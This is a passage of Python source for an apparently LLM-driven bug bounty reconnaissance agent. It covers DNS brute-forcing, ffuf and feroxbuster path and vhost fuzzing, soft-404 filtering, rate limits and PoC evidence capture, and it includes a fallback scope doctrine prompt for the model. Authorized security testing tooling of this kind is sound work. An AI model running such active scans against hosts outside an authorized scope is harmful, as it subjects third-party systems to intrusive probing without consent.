"""
hellhound/core/agent.py

Autonomous Bug Bounty Reconnaissance & Triage Agent.
Coordinates discovery tools, enforces code-level scope guardrails,
manages target task context, and triages verified findings.
"""

from dataclasses import dataclass
from datetime import datetime, timezone
import base64
import difflib
import hashlib
import hmac
import json
import logging
import time
import os
import threading
import concurrent.futures
from pathlib import Path
import re
import subprocess
import tempfile
from xml.etree import ElementTree as ET

# Generic CTF-style flag token (THM{...}, HTB{...}, flag{...}, CTF{...}, etc.)
# used to dedup record_finding calls that report the same flag under a
# reworded title instead of by exact-dict match.
_FLAG_TOKEN_PATTERN = re.compile(r"[A-Za-z0-9_]{2,20}\{[^{}]{3,150}\}")
import sys
from typing import Dict, Any, List, Optional, Callable, Set
from urllib.parse import urlparse, urljoin, urlunparse, parse_qsl

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from hellhound.core.scope import is_in_scope, check_module_against_rules, normalize_host, ScopeRules
from hellhound.core.tasks import (
    Target, create_or_load_target, save_target, sanitize_target_name,
    attach_target_to_program, set_program_scope, list_program_targets,
    load_program, sanitize_program_name, extract_raw_host,
)
from hellhound.core.guard import AutopilotGuard
from hellhound.core.ai_utils import (
    load_config,
    ask_neural_core,
    SYNTHESIZER_PERSONA,
    CHAT_PERSONA_SLM,
    ThinkingIndicator,
)
from hellhound.core.http_utils import (
    merge_global_context,
    normalize_headers,
    normalize_cookies,
)
from hellhound.memory import (
    build_investigation_summary,
    update_from_subfinder,
    update_from_httpx,
    update_from_spider,
    update_from_subzy,
    update_from_bac,
    add_lesson,
    find_relevant_lessons,
    format_lessons_block,
    dismiss_false_positive,
    is_dismissed_as_false_positive,
)
from hellhound.core.skills import (
    get_relevant_skills_prompt,
    discover_skills,
    load_skill_body,
)
from hellhound.core.toolcheck import ensure_tool, get_binary_path, install_hint, is_available, pick_available


def _load_baseline_rules() -> str:
    """Load always-on baseline doctrine rules from core baseline_rules.md."""
    rules_file = Path(__file__).resolve().parent / "baseline_rules.md"
    if rules_file.exists():
        try:
            return rules_file.read_text(encoding="utf-8").strip()
        except Exception:
            pass
    return (
        "BASELINE DOCTRINE:\n"
        "1. Verify target scope before network actions.\n"
        "2. Reconnaissance & factual triage only — no unauthorized exploitation. Knowledge sharing about offensive techniques is always permitted.\n"
        "3. Never record theoretical bugs; require concrete reproducible evidence.\n"
        "4. Qualify dead attack surfaces quickly."
    )


BASELINE_RULES_PROMPT = _load_baseline_rules()


logger = logging.getLogger("hellhound.agent")


# ==========================================================
# TOOL DEFINITIONS & SPECIFICATIONS
# ==========================================================

@dataclass
class ToolSpec:
    name: str
    description: str
    parameters: Dict[str, Any]
    executor: Callable[[Dict[str, Any], Target, Any], Dict[str, Any]]


# ==========================================================
# TOOL EXECUTORS (RECON & TRIAGE ONLY)
# ==========================================================

def _find_binary(name: str) -> Optional[str]:
    """Find binary in system PATH as well as standard user Go binary directories."""
    return get_binary_path(name)


def _resolve_resolvers_path() -> str:
    """Resolve DNS resolvers file, checking fast local list, tool configs, standard SecLists paths, or generating default public resolvers."""
    repo_root = Path(__file__).resolve().parent.parent
    candidates = [
        str(repo_root / "wordlists" / "dns" / "resolvers-fast.txt"),
        "/usr/share/wordlists/seclists/Miscellaneous/dns-resolvers.txt",
        "/usr/share/seclists/Miscellaneous/dns-resolvers.txt",
        str(Path.home() / "HACK-HUB" / "bug-hunting" / "Tools" / "resolvers.txt"),
        str(Path.home() / ".config" / "subfinder" / "resolvers.txt"),
        str(Path.home() / ".config" / "dnsx" / "resolvers.txt"),
        str(Path.home() / ".hellhound" / "resolvers.txt")
    ]
    for c in candidates:
        if os.path.exists(c) and os.path.getsize(c) > 0:
            return c
    default_res = Path.home() / ".hellhound" / "resolvers.txt"
    default_res.parent.mkdir(parents=True, exist_ok=True)
    if not default_res.exists() or default_res.stat().st_size == 0:
        default_res.write_text("1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n")
    return str(default_res)


# Every root a wordlist realistically lives under on a hunting box — not just
# the repo's own bundled fallback. Covers Kali's standard system locations
# (both the /usr/share/wordlists symlink farm and the real /usr/share/seclists
# tree), the classic dirb/dirbuster/wfuzz/amass package dirs, common manual
# SecLists clone spots, and the researcher's own home-directory conventions
# (~/HACK-HUB is this researcher's actual layout — see resolvers above).
_WORDLIST_SEARCH_ROOTS = [
    "/usr/share/wordlists",
    "/usr/share/seclists",
    "/usr/share/dirb/wordlists",
    "/usr/share/dirbuster",
    "/usr/share/wfuzz/wordlist",
    "/usr/share/amass/wordlists",
    "/opt/SecLists",
    "/opt/wordlists",
    str(Path.home() / "HACK-HUB"),
    str(Path.home() / "wordlists"),
    str(Path.home() / "SecLists"),
    str(Path.home() / ".local" / "share" / "wordlists"),
]


def _decompress_if_gz(path: Path) -> Path:
    """Kali ships rockyou.txt as rockyou.txt.gz; most fuzzing tools (ffuf,
    shuffledns) can't read gzip directly. Decompress once into a cached
    plaintext copy under ~/.hellhound/wordlist_cache and reuse it after."""
    if path.suffix != ".gz":
        return path
    cache_dir = Path.home() / ".hellhound" / "wordlist_cache"
    try:
        cache_dir.mkdir(parents=True, exist_ok=True)
        dest = cache_dir / path.stem  # strips the .gz
        if not dest.exists() or dest.stat().st_size == 0:
            import gzip
            import shutil
            with gzip.open(path, "rb") as f_in, open(dest, "wb") as f_out:
                shutil.copyfileobj(f_in, f_out)
        return dest
    except Exception:
        return path  # best-effort — caller's existence check will just fail through


def _resolve_wordlist(category: str, explicit: str = "",
                       curated_candidates: Optional[List[Path]] = None,
                       emit: Any = None) -> Optional[str]:
    """
    Resolve a wordlist for DNS/vhost/content fuzzing tools. Search order:
      1. `explicit` as a literal path — used as-is if it exists.
      2. `explicit` as a bare name (e.g. 'rockyou', 'raft-large-directories',
         'dirb') — case-insensitive filename search across every standard
         Linux wordlist location (SecLists, dirb, dirbuster, wfuzz, amass,
         and the researcher's own ~/HACK-HUB or ~/SecLists clones), so the
         researcher can say "use rockyou" / "use the raft list" without
         knowing the exact path on this particular box.
      3. `curated_candidates` — the caller's fast, known-good defaults for
         this category (unchanged behavior when no explicit wordlist is
         given — this stays the common-case path with zero extra latency).
      4. A best-effort broad search of the standard roots by category
         keyword, as a last resort before giving up entirely.
    Transparently decompresses a .gz hit (e.g. rockyou.txt.gz) into a cached
    plaintext copy.
    """
    def _pick(p: Path) -> Optional[str]:
        try:
            if p.exists() and p.is_file() and p.stat().st_size > 0:
                return str(_decompress_if_gz(p))
        except OSError:
            pass
        return None

    def _bounded_rglob(root_path: Path, cap: int = 20000):
        # rglob is lazy — cap how many entries we walk so a huge tree
        # (a full SecLists clone is tens of thousands of files) can't turn
        # a single tool call into a multi-minute filesystem crawl.
        for i, f in enumerate(root_path.rglob("*")):
            if i >= cap:
                return
            yield f

    if explicit:
        # 1. Literal path
        hit = _pick(Path(explicit).expanduser())
        if hit:
            return hit

        # 2. Bare name — search known roots for a filename match
        needle = explicit.strip().lower().replace(" ", "-").replace(".txt", "")
        matches = []
        for root in _WORDLIST_SEARCH_ROOTS:
            root_path = Path(root)
            if not root_path.exists():
                continue
            try:
                for f in _bounded_rglob(root_path):
                    if f.is_file() and needle in f.name.lower():
                        matches.append(f)
            except (PermissionError, OSError):
                continue
        if matches:
            matches.sort(key=lambda f: f.stat().st_size, reverse=True)
            if emit and hasattr(emit, "info"):
                emit.info(f"[*] Resolved wordlist '{explicit}' -> {matches[0]}")
            hit = _pick(matches[0])
            if hit:
                return hit
        if emit and hasattr(emit, "warn"):
            emit.warn(f"[!] Requested wordlist '{explicit}' not found on disk or in standard locations — falling back to default.")

    # 3. Curated known-good candidates for this category (default fast path)
    for wc in (curated_candidates or []):
        hit = _pick(Path(wc))
        if hit:
            return hit

    # 4. Best-effort broad search by category keyword
    category_hints = {
        "dns": ("dns", "subdomain"),
        "vhost": ("vhost", "subdomain", "dns"),
        "content": ("common", "directory", "raft", "content"),
    }.get(category, ())
    if category_hints:
        for root in _WORDLIST_SEARCH_ROOTS:
            root_path = Path(root)
            if not root_path.exists():
                continue
            try:
                for f in _bounded_rglob(root_path):
                    if f.is_file() and any(h in f.name.lower() for h in category_hints):
                        hit = _pick(f)
                        if hit:
                            return hit
            except (PermissionError, OSError):
                continue

    return None


def _execute_shuffledns(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Active DNS brute-force via shuffledns (massdns-backed) with wildcard handling."""
    domain = (args.get("domain") or target.name).strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("shuffledns", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "shuffledns not installed",
            "message": check["message"],
            "hint": "pdtm -i shuffledns"
        }

    binary = get_binary_path("shuffledns") or "shuffledns"

    # Resolve wordlist path (prioritize SecLists / Kali system wordlists, fallback to curated fast list)
    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        Path("/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
        Path("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"),
        Path("/usr/share/wordlists/seclists/Discovery/DNS/namelist.txt"),
        Path("/usr/share/seclists/Discovery/DNS/namelist.txt"),
        Path("/usr/share/wordlists/amass/subdomains.lst"),
        repo_root / "wordlists" / "dns" / "subdomains-fast.txt"
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No DNS wordlist found in repository or standard SecLists paths."}

    resolvers = _resolve_resolvers_path()
    massdns_bin = _find_binary("massdns") or "/usr/bin/massdns"

    cmd = [binary, "-d", domain, "-w", wordlist, "-r", resolvers, "-mode", "bruteforce", "-silent"]
    if os.path.exists(massdns_bin):
        cmd.extend(["-m", massdns_bin])

    try:
        proc = _run_cmd_with_heartbeat(cmd, timeout=90, emit=emit, label="dns_bruteforce (active DNS enumeration)")
        subdomains = [l.strip().lower() for l in proc.stdout.splitlines() if l.strip() and "." in l]
    except Exception as e:
        return {"error": f"shuffledns execution failed: {e}", "domain": domain}

    # Update target state
    if "subdomains" not in target.state:
        target.state["subdomains"] = []
    for s in subdomains:
        if s not in target.state["subdomains"]:
            target.state["subdomains"].append(s)

    return {
        "domain": domain,
        "count": len(subdomains),
        "subdomains": subdomains[:100],
        "total_discovered": len(subdomains)
    }


def _execute_ffuf_vhost(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Virtual-host fuzzing via ffuf to discover vhosts sharing an IP or host."""
    domain = args.get("domain", "").strip().lower() or target.name
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    target_ip = args.get("target_ip", "").strip() or domain
    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("ffuf", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "ffuf not installed",
            "message": check["message"],
            "hint": "go install github.com/ffuf/ffuf/v2@latest"
        }

    binary = get_binary_path("ffuf") or "ffuf"

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "vhosts" / "vhosts.txt",
        Path("/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No vhost wordlist found."}

    target_url = target_ip if target_ip.startswith(("http://", "https://")) else f"http://{target_ip}"

    import tempfile
    temp_json = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            temp_json = tf.name
    except Exception:
        temp_json = None

    cmd = [
        binary,
        "-w", wordlist,
        "-u", target_url,
        "-H", f"Host: FUZZ.{domain}",
        "-mc", "200,301,302,403",
    ]
    rate_limit = _resolve_fuzz_rate_limit(args)
    if rate_limit > 0:
        cmd.extend(["-rate", str(rate_limit)])
    if temp_json:
        cmd.extend(["-of", "json", "-o", temp_json])
    else:
        # No writable tempfile -- fall back to the old stdout-JSON mode,
        # which requires -s (silent) since nothing else may share stdout.
        cmd.extend(["-of", "json", "-o", "-", "-s"])

    results = []
    try:
        # -s (silent) dropped when we have a tempfile to write structured
        # results to: ffuf's normal per-match hit lines ("admin.example.com
        # [Status: 200, ...]") then go to stdout instead, so the same live
        # hit parser used for content discovery surfaces them in real time
        # rather than a static "still running" spinner for the whole scan.
        live_parser = _ffuf_live_parser if temp_json else None
        proc = _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="vhost_fuzz (Host header fuzzing)", live_parser=live_parser, target=target)

        if temp_json and os.path.exists(temp_json) and os.path.getsize(temp_json) > 0:
            with open(temp_json, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
        elif proc.stdout.strip():
            data = json.loads(proc.stdout)
        else:
            data = {}

        raw_res = data.get("results", [])
        for r in raw_res:
            vhost = r.get("input", {}).get("FUZZ", "")
            status = r.get("status", 0)
            length = r.get("length", 0)
            full_host = f"{vhost}.{domain}" if vhost else ""
            results.append({
                "host": full_host,
                "status": status,
                "length": length
            })
    except Exception as e:
        results = []
    finally:
        if temp_json and os.path.exists(temp_json):
            try:
                os.remove(temp_json)
            except Exception:
                pass

    return {
        "domain": domain,
        "target": target_url,
        "vhosts_found": results,
        "count": len(results)
    }


def _resolve_fuzz_rate_limit(args: Dict[str, Any]) -> int:
    """
    Resolves the requests/sec cap for a fuzzing run: an explicit per-call
    `rate_limit` arg wins, otherwise falls back to the configured
    `fuzz_rate_limit` default (see ai_utils.load_config). 0 or a negative
    value means "uncapped" -- the caller asked to skip the throttle (e.g.
    a disposable CTF/lab box where speed matters more than stealth).
    """
    explicit = args.get("rate_limit")
    if explicit is not None:
        try:
            return int(explicit)
        except (TypeError, ValueError):
            pass
    try:
        return int(load_config().get("fuzz_rate_limit", 150) or 0)
    except (TypeError, ValueError):
        return 150


_FFUF_LIVE_HIT_RE = re.compile(r'^(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)')


def _ffuf_live_parser(line: str) -> Optional[str]:
    """
    Parses one line of ffuf's normal (non-silent) stdout — a match line
    looks like "admin   [Status: 301, Size: 0, Words: 1, Lines: 1,
    Duration: 15ms]" — into a short, real-time "found this" line for
    _run_cmd_with_heartbeat's live_parser. Everything else ffuf prints
    (its banner, the progress bar, blank lines) simply doesn't match this
    pattern and is silently ignored, so only actual hits surface.
    """
    m = _FFUF_LIVE_HIT_RE.match(line.strip())
    if not m:
        return None
    word, status, size = m.group(1), m.group(2), m.group(3)
    return f"[{status}] /{word}  ({size} bytes)"


def _probe_soft_404_baseline(url: str, headers: Dict[str, str], cookies: Dict[str, str]) -> Optional[Dict[str, Any]]:
    """
    Requests a guaranteed-nonexistent path and records its status/length,
    so a fuzzer's hits can be checked against it before being reported as
    real finds. Many apps (SPAs, PHP front controllers, anything with a
    catch-all route) answer EVERY unknown path with HTTP 200 and the same
    body instead of a real 404 — content_discovery had no defense against
    this at all (only filtered by status code via -mc), which is exactly
    why a run against a soft-404 app reported hundreds of ".env", ".git",
    "config.php", etc. as "discovered" when every single one was the same
    4514-byte catch-all page. Returns None if the probe itself fails (no
    baseline to compare against — caller should not filter in that case).
    """
    import random
    import string
    probe_path = "zzz-hellhound-404-check-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=12))
    probe_url = url.rstrip("/") + "/" + probe_path
    try:
        r = requests.get(probe_url, headers=headers or {}, cookies=cookies or {}, timeout=8, allow_redirects=False, verify=False)
        return {"status": r.status_code, "length": len(r.content)}
    except Exception:
        return None


def _is_soft_404_hit(hit_status: int, hit_length: int, baseline: Optional[Dict[str, Any]]) -> bool:
    """
    True if a fuzzer hit looks like the same catch-all/soft-404 response
    the baseline probe got, rather than a genuinely distinct resource.
    Status AND length must both match the baseline — a real file that
    happens to share the baseline's status code but has a different size
    (or vice versa) is NOT filtered, only an exact match on both, which
    is what a templated "no route matched" page looks like across every
    guessed path.
    """
    if not baseline:
        return False
    return hit_status == baseline.get("status") and hit_length == baseline.get("length")


def _execute_ffuf_content(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Content & directory fuzzing via ffuf."""
    import tempfile
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("ffuf", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "ffuf not installed",
            "message": check["message"],
            "hint": "go install github.com/ffuf/ffuf/v2@latest"
        }

    binary = get_binary_path("ffuf") or "ffuf"

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "web" / "directories-fast.txt",
        Path("/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/wordlists/dirb/common.txt"),
        Path("/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break

    if not wordlist:
        return {"error": "No directory wordlist found."}

    target_url = url.rstrip("/") + "/FUZZ"
    temp_json = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
            temp_json = tf.name
    except Exception:
        temp_json = None

    # Pass authenticated headers/cookies if available -- resolved BEFORE
    # building cmd now, because the soft-404 baseline probe below needs
    # the exact same headers/cookies ffuf itself will send (an auth'd
    # app's soft-404 page can differ from its anonymous one).
    req_headers = normalize_headers(args.get("headers"))
    if not req_headers and hasattr(target, "state") and isinstance(target.state, dict):
        req_headers = normalize_headers(target.state.get("headers"))

    req_cookies = normalize_cookies(args.get("cookies") or args.get("cookie"))
    if not req_cookies and hasattr(target, "state") and isinstance(target.state, dict):
        req_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))

    # ── Soft-404 baseline: probe one definitely-nonexistent path up front
    # and remember its status+length so every ffuf "hit" can be checked
    # against it afterward. Without this, an app that answers every
    # unknown path with HTTP 200 and the same catch-all body (SPA router,
    # PHP front controller, etc.) makes ffuf report its ENTIRE wordlist as
    # "discovered" -- ffuf's own -mc status filter can't tell a real find
    # from a soft-404 since both come back 200.
    baseline = _probe_soft_404_baseline(url, req_headers, req_cookies)

    cmd = [
        binary,
        "-w", wordlist,
        "-u", target_url,
        "-mc", "200,204,301,302,307,401,403,405",
        "-t", "40",
        "-timeout", "5",
        # ffuf's own behavioral auto-calibration: sends a handful of
        # randomized-path requests before the real run and auto-derives
        # -fs/-fw filters from whatever they have in common. This is the
        # same class of defense feroxbuster already does automatically
        # (seen working in the fuzz_hunter run's "Auto-filtering" line) --
        # content_discovery had no equivalent at all before this. Kept in
        # addition to (not instead of) the explicit baseline check below,
        # since -ac is heuristic and can miss a target with inconsistent
        # soft-404 bodies across different generated probe paths.
        "-ac",
    ]

    # Uncapped ffuf hits a target as fast as 40 threads can go -- fine on a
    # disposable CTF box, a good way to trip a WAF/account-lockout on a
    # live/production target. rate_limit arg (or config fuzz_rate_limit
    # default) caps requests/sec; 0 or negative explicitly means uncapped.
    rate_limit = _resolve_fuzz_rate_limit(args)
    if rate_limit > 0:
        cmd.extend(["-rate", str(rate_limit)])

    if temp_json:
        cmd.extend(["-of", "json", "-o", temp_json])

    for hk, hv in req_headers.items():
        if isinstance(hv, str) and hv.strip():
            cmd.extend(["-H", f"{hk}: {hv.strip()}"])

    if req_cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in req_cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    results = []
    soft_404_filtered = 0
    try:
        # -s (silent) dropped deliberately: ffuf's normal output prints one
        # line per match as it happens ("admin   [Status: 301, Size: 0,
        # ...]") — _ffuf_live_parser surfaces those live instead of the
        # researcher seeing nothing but a static "still running" spinner
        # for the entire fuzz run, same live-feed feel as the spider tool.
        proc = _run_cmd_with_heartbeat(cmd, timeout=90, emit=emit, label="content_discovery (path fuzzing)", live_parser=_ffuf_live_parser, target=target)
        
        # Read structured JSON output from tempfile
        if temp_json and os.path.exists(temp_json) and os.path.getsize(temp_json) > 0:
            with open(temp_json, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
                raw_res = data.get("results", [])
                for r in raw_res:
                    path = r.get("input", {}).get("FUZZ", "")
                    status = r.get("status", 0)
                    length = r.get("length", 0)
                    redirect = r.get("redirectlocation", "")
                    hit_url = r.get("url", f"{url.rstrip('/')}/{path}")
                    if _is_soft_404_hit(status, length, baseline):
                        soft_404_filtered += 1
                        continue
                    results.append({
                        "url": hit_url,
                        "path": path,
                        "status": status,
                        "length": length,
                        "redirect": redirect
                    })
        elif proc.stdout.strip():
            # Fallback: parse raw lines from stdout
            for line in proc.stdout.strip().splitlines():
                line_clean = line.strip()
                if line_clean and not line_clean.startswith("[") and not line_clean.startswith("::"):
                    results.append({
                        "url": f"{url.rstrip('/')}/{line_clean}",
                        "path": line_clean,
                        "status": 200,
                        "length": 0
                    })
    except Exception as e:
        results = []
    finally:
        if temp_json and os.path.exists(temp_json):
            try:
                os.remove(temp_json)
            except Exception:
                pass

    paths = [r["path"] for r in results]

    # Automatically register discovered endpoints in target state
    if hasattr(target, "state") and isinstance(target.state, dict):
        if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
            target.state["endpoints"] = []
        for r in results:
            hit_url = r.get("url")
            if hit_url and hit_url not in target.state["endpoints"]:
                target.state["endpoints"].append(hit_url)
        save_target(target)

    if soft_404_filtered and emit and hasattr(emit, "info"):
        emit.info(f"[*] Filtered {soft_404_filtered} soft-404 hit(s) — same status+length as a known-nonexistent path, not real finds.")

    return {
        "target_url": url,
        "paths": paths,
        "discovered_endpoints": results[:100],
        "count": len(results),
        "soft_404_filtered_count": soft_404_filtered,
        "soft_404_baseline": baseline,
    }


_FEROXBUSTER_LIVE_HIT_RE = re.compile(r'^(\d{3})\s+\w+\s+\d+l\s+\d+w\s+\d+c\s+(\S+)')


def _feroxbuster_live_parser(line: str) -> Optional[str]:
    """
    Parses one line of feroxbuster's normal (non-quiet) stdout -- a hit
    line looks like "200      GET       10l       25w      162c
    https://target/robots.txt" -- into a short, real-time "found this"
    line for _run_cmd_with_heartbeat's live_parser. feroxbuster's --json
    formatting only applies to the -o file (a separate stream from
    stdout), so stdout stays human-readable even with --json set, and
    the banner/progress-bar noise simply won't match this pattern.
    """
    m = _FEROXBUSTER_LIVE_HIT_RE.match(line.strip())
    if not m:
        return None
    status, hit_url = m.group(1), m.group(2)
    return f"[{status}] {hit_url}"


def _execute_feroxbuster_content(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Content & directory fuzzing via feroxbuster — purpose-built for
    recursive content discovery (auto-recurses into discovered directories
    without a separate re-fuzz pass, and has smarter default response
    filtering than a bare ffuf invocation). Same calling convention and
    return shape as _execute_ffuf_content so callers (fuzz_hunter's
    auto-detect dispatch, or a direct call) can treat the two
    interchangeably."""
    import tempfile
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    binary = get_binary_path("feroxbuster")
    if not binary:
        return {"error": "feroxbuster not installed", "hint": install_hint("feroxbuster")}

    repo_root = Path(__file__).resolve().parent.parent
    wordlist_candidates = [
        repo_root / "wordlists" / "web" / "directories-fast.txt",
        Path("/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/seclists/Discovery/Web-Content/common.txt"),
        Path("/usr/share/wordlists/dirb/common.txt"),
        Path("/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt")
    ]
    wordlist = None
    for wc in wordlist_candidates:
        if wc.exists() and wc.stat().st_size > 0:
            wordlist = str(wc)
            break
    if not wordlist:
        return {"error": "No directory wordlist found."}

    depth = int(args.get("max_depth", 4) or 4)
    threads = int(args.get("threads", 40) or 40)

    temp_json = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False) as tf:
            temp_json = tf.name
    except Exception:
        temp_json = None

    cmd = [
        binary,
        "-u", url.rstrip("/"),
        "-w", wordlist,
        "-t", str(threads),
        "-d", str(depth),
        "-s", "200,204,301,302,307,308,401,403,405",
        "-k",   # don't choke on self-signed certs on lab/internal targets
        "--json",
    ]

    # feroxbuster's recursion multiplies total request volume fast (every
    # discovered directory gets re-fuzzed up to `depth` deep), so an
    # unthrottled rate matters even more here than for a single-pass ffuf
    # run. Same rate_limit arg / fuzz_rate_limit config default as the ffuf
    # executors; 0 or negative explicitly means uncapped.
    rate_limit = _resolve_fuzz_rate_limit(args)
    if rate_limit > 0:
        cmd.extend(["--rate-limit", str(rate_limit)])
    # -q (quiet) deliberately dropped: it was suppressing feroxbuster's
    # normal per-hit stdout lines entirely, leaving the researcher staring
    # at a static "still running" spinner for the whole scan with zero
    # visibility into what was actually being found. --json only reformats
    # what goes to the -o file (a separate stream), so stdout keeps
    # printing its normal human-readable hit lines, which
    # _feroxbuster_live_parser now surfaces live as they happen.
    if temp_json:
        cmd.extend(["-o", temp_json])

    req_headers = normalize_headers(args.get("headers"))
    if not req_headers and hasattr(target, "state") and isinstance(target.state, dict):
        req_headers = normalize_headers(target.state.get("headers"))
    for hk, hv in req_headers.items():
        if isinstance(hv, str) and hv.strip():
            cmd.extend(["-H", f"{hk}: {hv.strip()}"])

    req_cookies = normalize_cookies(args.get("cookies") or args.get("cookie"))
    if not req_cookies and hasattr(target, "state") and isinstance(target.state, dict):
        req_cookies = normalize_cookies(target.state.get("cookies") or target.state.get("session_cookie"))
    if req_cookies:
        cookie_str = "; ".join(f"{k}={v}" for k, v in req_cookies.items())
        cmd.extend(["-H", f"Cookie: {cookie_str}"])

    results = []
    try:
        _run_cmd_with_heartbeat(cmd, timeout=120, emit=emit, label="fuzz_hunter (feroxbuster, recursive)", live_parser=_feroxbuster_live_parser, target=target)
        # feroxbuster writes one JSON object per line to -o when --json is
        # set — NOT a single JSON document like ffuf's -of json, so this
        # is parsed line-by-line rather than with one json.load().
        if temp_json and os.path.exists(temp_json) and os.path.getsize(temp_json) > 0:
            with open(temp_json, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        obj = json.loads(line)
                    except Exception:
                        continue
                    if obj.get("type") != "response":
                        continue
                    hit_url = obj.get("url", "")
                    status = obj.get("status", 0)
                    length = obj.get("content_length", 0)
                    path = hit_url[len(url.rstrip("/")):] if hit_url.startswith(url.rstrip("/")) else hit_url
                    results.append({
                        "url": hit_url,
                        "path": path,
                        "status": status,
                        "length": length,
                        "redirect": obj.get("headers", {}).get("location", "") if isinstance(obj.get("headers"), dict) else ""
                    })
    except Exception:
        results = []
    finally:
        if temp_json and os.path.exists(temp_json):
            try:
                os.remove(temp_json)
            except Exception:
                pass

    paths = [r["path"] for r in results]

    if hasattr(target, "state") and isinstance(target.state, dict):
        if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
            target.state["endpoints"] = []
        for r in results:
            hit_url = r.get("url")
            if hit_url and hit_url not in target.state["endpoints"]:
                target.state["endpoints"].append(hit_url)
        save_target(target)

    return {
        "target_url": url,
        "paths": paths,
        "discovered_endpoints": results[:100],
        "count": len(results)
    }


_HTTP_CLIENT_CMD_RE = re.compile(r"\b(curl|wget|http|httpie)\b")
_TERMINAL_URL_RE = re.compile(r"https?://[^\s\"'`|><\\]+")


def _mirror_http_evidence_from_terminal(command: str, proc: Any, target: Target, target_host: str) -> None:
    """
    Closes the real gap behind a real bug: a PoC run via raw curl inside
    run_terminal_command (sqlmap-style injection chains, a heredoc python
    script, or just a researcher-dictated curl one-liner) produced NO
    evidence record_finding/export_report could ever find — only requests
    made through the dedicated `curl` TOOL were ever written to
    target.state['curl_evidence_log']. The agent's own read on this was
    "pure discipline, not a code problem" (told to use the curl tool every
    time); that doesn't hold up — a model consistently reaching for
    run_terminal_command instead is a code problem, and the fix is to make
    this path ALSO capture evidence rather than relying on the model to
    always choose the right tool for an exploit that could just as easily
    be a 3-line python/requests script as a single curl call.

    Deliberately narrow and best-effort: only fires when the command looks
    like an HTTP client (curl/wget/http[ie]) hitting a URL on the active
    target, extracts whatever came back (status line if present, otherwise
    just the raw output — an LFI/RCE PoC's output IS the evidence even
    with no HTTP status line visible), and appends it in the exact shape
    _execute_curl already writes so _lookup_curl_evidence finds it
    automatically on the next record_finding/export_report call. Never
    raises — evidence capture must never break the actual command result.
    """
    try:
        if not _HTTP_CLIENT_CMD_RE.search(command):
            return
        url_match = _TERMINAL_URL_RE.search(command)
        if not url_match:
            return
        url = url_match.group(0).rstrip("'\"")

        # Only mirror requests that actually touch the active target — a
        # curl pulling a wordlist/tool from GitHub shouldn't end up filed
        # as "evidence" against this target.
        host_for_match = (target_host or (target.host if target and target.host else "") or (target.name if target else "")).lower()
        if host_for_match and host_for_match not in url.lower():
            return

        method_match = re.search(r"-X\s+([A-Za-z]+)", command) or re.search(r"--request\s+([A-Za-z]+)", command)
        if method_match:
            method = method_match.group(1).upper()
        elif re.search(r"(-d\b|--data\b|--data-raw\b|--data-binary\b)", command):
            method = "POST"
        else:
            method = "GET"

        output = (proc.stdout or "") if (proc.stdout or "").strip() else (proc.stderr or "")
        if not output.strip():
            return
        # Cap what gets stored — this is proof-of-impact evidence, not a
        # full log dump; _lookup_curl_evidence/export_report only ever
        # want a representative excerpt anyway.
        output_capped = output[:4000]

